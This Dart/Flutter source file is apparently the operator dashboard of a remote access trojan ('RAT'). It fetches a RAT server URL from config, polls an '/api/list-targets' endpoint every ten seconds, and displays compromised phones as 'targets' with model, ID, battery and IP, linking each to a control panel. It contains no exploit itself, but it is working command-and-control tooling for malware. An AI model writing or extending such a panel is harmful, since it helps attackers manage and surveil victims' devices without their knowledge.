import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';

// IMPORT CONFIG
import 'services/api_config_service.dart';

class DeviceDashboardPage extends StatefulWidget {
  const DeviceDashboardPage({super.key});

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> {
  List<dynamic> _devices = [];
  bool _isLoading = true;
  Timer? _timer;

  @override
  void initState() {
    super.initState();
    _fetchDevices();
    _timer = Timer.periodic(
      const Duration(seconds: 10),
      (timer) => _fetchDevices(),
    );
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  Future<void> _fetchDevices() async {
    try {
      // 🔥 AMBIL URL RAT DARI CONFIG
      final urlRat = await ApiConfig.urlRat;

      if (urlRat == null || urlRat.isEmpty) {
        throw Exception("url_rat kosong / belum tersedia");
      }

      final fullUrl = "$urlRat/api/list-targets";

      final response = await http.get(Uri.parse(fullUrl));

      if (response.statusCode == 200) {
        if (mounted) {
          setState(() {
            _devices = jsonDecode(response.body);
            _isLoading = false;
          });
        }
      } else {
        debugPrint("HTTP Error: ${response.statusCode}");
      }
    } catch (e) {
      debugPrint("❌ Error fetching devices: $e");
    }
  }

  @override
  Widget build(BuildContext context) {
    int activeCount = _devices.isNotEmpty ? 1 : 0;

    return Scaffold(
      backgroundColor: const Color(0xFF0A0C10),
      body: SafeArea(
        child: Stack(
          children: [
            Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // HEADER
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 15),
                  decoration: BoxDecoration(
                    color: const Color(0xFF12161E),
                    borderRadius: const BorderRadius.only(
                      bottomLeft: Radius.circular(20),
                      bottomRight: Radius.circular(20),
                    ),
                    border: Border(
                      bottom: BorderSide(color: Colors.green.withOpacity(0.2)),
                    ),
                  ),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const Text("ACTIVE TARGETS",
                              style: TextStyle(color: Colors.green, fontSize: 8)),
                          const SizedBox(height: 4),
                          Text("$activeCount",
                              style: const TextStyle(
                                  color: Colors.greenAccent,
                                  fontSize: 20,
                                  fontWeight: FontWeight.bold)),
                        ],
                      ),
                      GestureDetector(
                        onTap: _fetchDevices,
                        child: Icon(Icons.radar,
                            color: Colors.greenAccent.withOpacity(0.8),
                            size: 30),
                      ),
                      Column(
                        crossAxisAlignment: CrossAxisAlignment.end,
                        children: [
                          const Text("TOTAL DEVICES",
                              style:
                                  TextStyle(color: Colors.white54, fontSize: 8)),
                          const SizedBox(height: 4),
                          Text("${_devices.length}",
                              style: const TextStyle(
                                  color: Colors.greenAccent,
                                  fontSize: 20,
                                  fontWeight: FontWeight.bold)),
                        ],
                      ),
                    ],
                  ),
                ),

                const SizedBox(height: 15),

                // SUBHEADER
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 20),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      const Text("CONNECTED DEVICES",
                          style: TextStyle(
                              color: Colors.greenAccent,
                              fontSize: 12,
                              fontWeight: FontWeight.bold)),
                      GestureDetector(
                        onTap: () => Navigator.pop(context),
                        child: const Icon(Icons.close,
                            color: Colors.redAccent, size: 18),
                      )
                    ],
                  ),
                ),

                const SizedBox(height: 10),

                // GRID
                Expanded(
                  child: _isLoading
                      ? const Center(
                          child: CircularProgressIndicator(
                              color: Colors.greenAccent))
                      : _devices.isEmpty
                          ? const Center(
                              child: Text("NO TARGETS FOUND",
                                  style: TextStyle(
                                      color: Colors.green,
                                      fontWeight: FontWeight.bold)))
                          : GridView.builder(
                              padding: const EdgeInsets.all(10),
                              gridDelegate:
                                  const SliverGridDelegateWithFixedCrossAxisCount(
                                crossAxisCount: 3,
                                crossAxisSpacing: 8,
                                mainAxisSpacing: 8,
                                childAspectRatio: 0.75,
                              ),
                              itemCount: _devices.length,
                              itemBuilder: (context, index) {
                                final device = _devices[index];

                                bool isActive = index == 0;
                                Color statusColor = isActive
                                    ? Colors.greenAccent
                                    : Colors.redAccent;

                                return GestureDetector(
                                  onTap: () {
                                    Navigator.pushNamed(
                                      context,
                                      '/control_panel',
                                      arguments: device,
                                    );
                                  },
                                  child: Container(
                                    padding: const EdgeInsets.all(8),
                                    decoration: BoxDecoration(
                                      color: const Color(0xFF0F1116),
                                      borderRadius: BorderRadius.circular(12),
                                      border: Border.all(
                                        color: isActive
                                            ? Colors.greenAccent.withOpacity(0.5)
                                            : Colors.white12,
                                      ),
                                    ),
                                    child: Column(
                                      crossAxisAlignment:
                                          CrossAxisAlignment.start,
                                      children: [
                                        Row(
                                          mainAxisAlignment:
                                              MainAxisAlignment.spaceBetween,
                                          children: [
                                            const Icon(Icons.phone_android,
                                                color: Colors.white54, size: 14),
                                            Text(
                                              isActive ? "ON" : "OFF",
                                              style: TextStyle(
                                                  color: statusColor,
                                                  fontSize: 8),
                                            )
                                          ],
                                        ),
                                        const Spacer(),
                                        Text(device['model'] ?? "Unknown",
                                            style: const TextStyle(
                                                color: Colors.greenAccent,
                                                fontSize: 10)),
                                        Text(device['id'] ?? "NO-ID",
                                            style: const TextStyle(
                                                color: Colors.white24,
                                                fontSize: 7)),
                                        const Spacer(),
                                        Text(
                                            "Battery: ${device['battery'] ?? 0}%",
                                            style: const TextStyle(
                                                color: Colors.white70,
                                                fontSize: 8)),
                                        Text(
                                            "IP: ${device['ip'] ?? '-'}",
                                            style: const TextStyle(
                                                color: Colors.white24,
                                                fontSize: 6)),
                                      ],
                                    ),
                                  ),
                                );
                              },
                            ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }
}